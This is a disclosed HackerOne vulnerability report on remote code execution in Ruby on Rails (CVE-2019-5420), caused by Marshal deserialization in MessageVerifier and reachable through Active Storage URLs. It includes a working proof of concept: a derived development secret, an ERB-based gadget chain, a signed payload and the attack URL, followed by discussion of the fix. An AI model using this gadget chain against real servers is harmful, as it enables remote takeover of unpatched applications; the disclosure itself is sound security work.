---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/command-injection-generic
  - env/web
  - stack/ruby
  - vuln/deserialization
  - vuln/rce-unsafe-deserialization
  - impact/rce
substate: "resolved"
weakness: "Command Injection - Generic"
enriched: true
body: true
date: 2019-03-13
submitted: 2019-01-02T03:20:45.831Z
bounty_usd: 1500
votes: 41
cve: "CVE-2019-5420"
program: "[[programs/rails|Ruby on Rails]]"
reporter: "ooooooo_q"
source: "https://hackerone.com/reports/473888"
title: "RCE which may occur due to `ActiveSupport::MessageVerifier` or `ActiveSupport::MessageEncryptor` (especially Active storage)"
---
# RCE which may occur due to `ActiveSupport::MessageVerifier` or `ActiveSupport::MessageEncryptor` (especially Active storage)

> **Severity:** High | **Bounty:** 1,500 USD | **Votes:** 41 | **Program:** Ruby on Rails | **Disclosed:** 2019-03-13

- Report: [https://hackerone.com/reports/473888](https://hackerone.com/reports/473888)
- CWE: Command Injection - Generic | CVE: CVE-2019-5420
- Submitted: 2019-01-02T03:20:45.831Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Since `ActiveSupport::MessageVerifier` and `ActiveSupport::MessageEncryptor` use Marshal as the default serializer, I confirmed that RCE is possible by object injection.


```ruby
# https://github.com/rails/rails/blob/v5.2.2/activesupport/lib/active_support/message_verifier.rb#L110
    def initialize(secret, options = {})
      raise ArgumentError, "Secret should not be nil." unless secret
      @secret = secret
      @digest = options[:digest] || "SHA1"
      @serializer = options[:serializer] || Marshal
    end
```

```ruby
# https://github.com/rails/rails/blob/v5.2.2/activesupport/lib/active_support/message_encryptor.rb#L145
def initialize(secret, *signature_key_or_options)
  options = signature_key_or_options.extract_options!
  sign_secret = signature_key_or_options.first
  @secret = secret
  @sign_secret = sign_secret
  @cipher = options[:cipher] || self.class.default_cipher
  @digest = options[:digest] || "SHA1" unless aead_mode?
  @verifier = resolve_verifier
  @serializer = options[:serializer] || Marshal
end
```

Especially in Rails 5.2 and later, `ActiveSupport::MessageVerifier` is used to validate the URL used in Active Storage, and attacks are possible.


```ruby
# https://github.com/rails/rails/blob/v5.2.2/activestorage/lib/active_storage/engine.rb#L81
initializer "active_storage.verifier" do
  config.after_initialize do |app|
    ActiveStorage.verifier = app.message_verifier("ActiveStorage")
  end
end
```

```ruby
# https://github.com/rails/rails/blob/v5.2.2/activestorage/app/controllers/active_storage/disk_controller.rb#L38
def decode_verified_key
  ActiveStorage.verifier.verified(params[:encoded_key], purpose: :blob_key)
end
```

It is also used in `ActiveStorage::Blob.find_signed`.
Also, these URLs can be accessed without using Active Storage.

### PoC

#### 1. Prepare server

```
$ ruby -v
ruby 2.6.0p0 (2018-12-25 revision 66547) [x86_64-darwin16]

$ rails -v
Rails 5.2.2

$ rails new verifier_rce
$ cd verifier_rce/
$ bundle install
```

```
# Active Storage is not installed, but routes is usable
$ bin/rails routes
Prefix Verb URI Pattern                                                                              Controller#Action
rails_service_blob GET  /rails/active_storage/blobs/:signed_id/*filename(.:format)                               active_storage/blobs#show
rails_blob_representation GET  /rails/active_storage/representations/:signed_blob_id/:variation_key/*filename(.:format) active_storage/representations#show
rails_disk_service GET  /rails/active_storage/disk/:encoded_key/*filename(.:format)                              active_storage/disk#show
update_rails_disk_service PUT  /rails/active_storage/disk/:encoded_token(.:format)                                      active_storage/disk#update
rails_direct_uploads POST /rails/active_storage/direct_uploads(.:format)                                           active_storage/direct_uploads#create
```

#### 2. Prepare payload

```ruby
$ ls /tmp/rce
ls: /tmp/rce: No such file or directory

$ bundle exec rails console
Running via Spring preloader in process 66998
Loading development environment (Rails 5.2.2)

irb(main):001:0> # emulate verifier
=> nil
irb(main):002:0> app_class_name = VerifierRce::Application.name
=> "VerifierRce::Application"
irb(main):003:0> secret_key_base = Digest::MD5.hexdigest(VerifierRce::Application.name)
=> "7e485df67863e85e584b3feecb22276d"
irb(main):004:0> key_generator = ActiveSupport::CachingKeyGenerator.new(ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000))
=> #<ActiveSupport::CachingKeyGenerator:0x00007ff55ac60d48 @key_generator=#<ActiveSupport::KeyGenerator:0x00007ff55ac60d98 @secret="7e485df67863e85e584b3feecb22276d", @iterations=1000>, @cache_keys=#<Concurrent::Map:0x00007ff55ac60cf8 entries=0 default_proc=nil>>
irb(main):005:0> secret = key_generator.generate_key("ActiveStorage")
=> "\xB09\x11u/6#\x04\xE6\x15\x9C_\xBB\xE8\x94\xD0pn<\xFD\x15\x85\x95\x8BR\x82\x13\xCA\xC3\xDE\xAEB\x98\xDA\v\xD6+jI\xE6\x80\x9E\xC8$e\xE8(\xD5\x98\x82\x1FVy1\x9D>R\xAE\x9D\xAE\x88\xF1\xBA,"
irb(main):006:0> verifier = ActiveSupport::MessageVerifier.new(secret)
=> #<ActiveSupport::MessageVerifier:0x00007ff558aaee20 @secret="\xB09\x11u/6#\x04\xE6\x15\x9C_\xBB\xE8\x94\xD0pn<\xFD\x15\x85\x95\x8BR\x82\x13\xCA\xC3\xDE\xAEB\x98\xDA\v\xD6+jI\xE6\x80\x9E\xC8$e\xE8(\xD5\x98\x82\x1FVy1\x9D>R\xAE\x9D\xAE\x88\xF1\xBA,", @digest="SHA1", @serializer=Marshal, @options={}, @rotations=[]>
irb(main):007:0>


irb(main):008:0> # https://medium.com/@u0x/marshall-unserialization-exploit-for-ruby-on-rails-5-1-4-979475cfdba0
=> nil
irb(main):009:0> code = '`touch /tmp/rce`'
=> "`touch /tmp/rce`"
irb(main):010:0> erb = ERB.allocate
=> #<ERB:0x00007ff55acabdc0>
irb(main):011:0> erb.instance_variable_set :@src, code
=> "`touch /tmp/rce`"
irb(main):012:0> erb.instance_variable_set :@filename, "1"
=> "1"
irb(main):013:0> erb.instance_variable_set :@lineno, 1
=> 1
irb(main):014:0> dump_target  = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result
=> ""
irb(main):015:0>

irb(main):016:0> verifier.generate(dump_target, purpose: :blob_key)
=> "eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHZPa0JCWTNScGRtVlRkWEJ3YjNKME9qcEVaWEJ5WldOaGRHbHZiam82UkdWd2NtVmpZWFJsWkVsdWMzUmhibU5sVm1GeWFXRmliR1ZRY205NGVRazZEa0JwYm5OMFlXNWpaVzg2Q0VWU1FnZzZDVUJ6Y21OSkloVmdkRzkxWTJnZ0wzUnRjQzl5WTJWZ0Jqb0dSVlE2RGtCbWFXeGxibUZ0WlVraUJqRUdPd2xVT2d4QWJHbHVaVzV2YVFZNkRFQnRaWFJvYjJRNkMzSmxjM1ZzZERvSlFIWmhja2tpREVCeVpYTjFiSFFHT3dsVU9oQkFaR1Z3Y21WallYUnZja2wxT2g5QlkzUnBkbVZUZFhCd2IzSjBPanBFWlhCeVpXTmhkR2x2YmdBR093bFUiLCJleHAiOm51bGwsInB1ciI6ImJsb2Jfa2V5In19--78c21ddf5ca4239d862118730069e04fbf38fd3d"
```

```
# Confirm that the file was generated due to the side effect of creating payload
$ ls /tmp/rce
/tmp/rce

# Erase the file as it disturbs the operation check
$ rm /tmp/rce
$ ls /tmp/rce
ls: /tmp/rce: No such file or directory
```

#### 3. Attack

Start server.

```
$ bin/rails s
```

Open URL in browser.
(`GET  /rails/active_storage/disk/:encoded_key/*filename`, use payload for `:encoded_key`)

```
http://0.0.0.0:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHZPa0JCWTNScGRtVlRkWEJ3YjNKME9qcEVaWEJ5WldOaGRHbHZiam82UkdWd2NtVmpZWFJsWkVsdWMzUmhibU5sVm1GeWFXRmliR1ZRY205NGVRazZEa0JwYm5OMFlXNWpaVzg2Q0VWU1FnZzZDVUJ6Y21OSkloVmdkRzkxWTJnZ0wzUnRjQzl5WTJWZ0Jqb0dSVlE2RGtCbWFXeGxibUZ0WlVraUJqRUdPd2xVT2d4QWJHbHVaVzV2YVFZNkRFQnRaWFJvYjJRNkMzSmxjM1ZzZERvSlFIWmhja2tpREVCeVpYTjFiSFFHT3dsVU9oQkFaR1Z3Y21WallYUnZja2wxT2g5QlkzUnBkbVZUZFhCd2IzSjBPanBFWlhCeVpXTmhkR2x2YmdBR093bFUiLCJleHAiOm51bGwsInB1ciI6ImJsb2Jfa2V5In19--78c21ddf5ca4239d862118730069e04fbf38fd3d/test
```

Confirm that the file was created.

```
$ ls /tmp/rce
/tmp/rce
```

## Impact

If the server is running in development mode with version 5.2 or later, if the attacker can know application name, `secret_key_base` can be obtained, so RCE can be easily done by accessing the URL.
In production mode, an attacker needs to know `secret_key_base`.

For versions less than 5.2, attacks are possible only if the user is able to input places using `ActiveSupport::MessageVerifier` or `ActiveSupport::MessageEncryptor` and the attacker knows `secret_key_base`.

### proposed measures

- Use `JSON.load` or `Yaml.safe_load` without using Marshal
- Disable access to URL if Active Storage is not used

## Timeline

- **Report Filed**
- **2019-01-02** @ooooooo_q: Sorry, it was `JSON.parse` instead of `JSON.load`.
- **2019-01-07** @ooooooo_q: There are few cases where an attacker can directly access servers in development mode.
However, because it is a GET access, it can be attacked using access to images, for example.
An attacker could induce the developer to gain access to the trapping site and include the payload of the attack in the URL of the image.
- **2019-01-07** @ooooooo_q: This vulnerability seems to affect https://hackerone.com.

Response when accessing https://hackerone.com/rails/active_storage/disk/test/test is empty.
Because normal 404 pages are displayed as https://hackerone.com/404, it seems that the URL of active storage is used.
- **2019-01-15** @ooooooo_q: @rails Any updates?
- **2019-01-15** @tenderlove: @ooooooo_q Hi, sorry for the late response.  I'm taking a look :)
- **2019-01-15** @tenderlove: Hi,

We've been discussing how to fix this.  I thought JSON or YAML would work, but apparently [Rails supports serializing arbitrary objects](https://github.com/rails/rails/blob/a08827a90b5a9be79379019cf5b242bd7236d2e3/activesupport/test/message_verifier_test.rb#L22).  Switching to JSON breaks tests.  `YAML.safe_load` supports more types than JSON, so maybe we could use that.  Another thought I had is we could make the `secret_key_base` not so easy to guess.

I don't like that Marshal is the default.  I think we should switch the default to JSON or YAML, but I'm certain it will break apps.  A less predictable secret_key_base might be the right fix here.  What do you think?
- **2019-01-16** @ooooooo_q: @tenderlove 
Hi,

I imagined that for 5.2.x the following changes would be made.
(For other versions, I imagined breaking change when major version was upgraded.)


```ruby
  class StorageSerializer
    def self.load(value)
      v = JSON.parse(value)
      v.is_a?(Hash) ? v.symbolize_keys : v
    end

    def self.dump(value)
      JSON.dump(value)
    end
  end

  class Application < Rails::Application

   ...

    def message_verifier(verifier_name)
      serializer = verifier_name == "ActiveStorage" ? StorageSerializer : Marshal;
      @message_verifiers[verifier_name] ||= begin
        secret = key_generator.generate_key(verifier_name.to_s)
        ActiveSupport::MessageVerifier.new(secret, serializer: serializer)
      end
    end
  end
```

Also, by avoiding inferring secret_key_base as you say, the problem is alleviated. (Depending on what secret_key_base can guess, there may be other unexpected problems occurring.)

If there is no other effect, I think that it is better to do both.
- **Report Triaged**
- **Cve Id Added**
- **Report Resolved**
- **Bounty Awarded**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **2019-03-27** @ooooooo_q: @tenderlove  @rails 

hello,

In 5.2.x or later, it seems that it is not known to developers that it is possible to attack with the URL for active storage.
Some people think it's a problem with the cookie store.

However, the combination with CVE-2019-5418 is widespread among bug hunters.

The default time limit for active storage url is 5 minutes, and I thought that it would be better to issue a fix because the downtime usually falls within 5 minutes even if the serializer is changed by a patch.
https://github.com/rails/rails/blob/5-2-stable/activestorage/lib/active_storage/service.rb#L44
- **2019-04-13** @ooooooo_q: @rails 
Are there plans to change the serializer in Active storage?
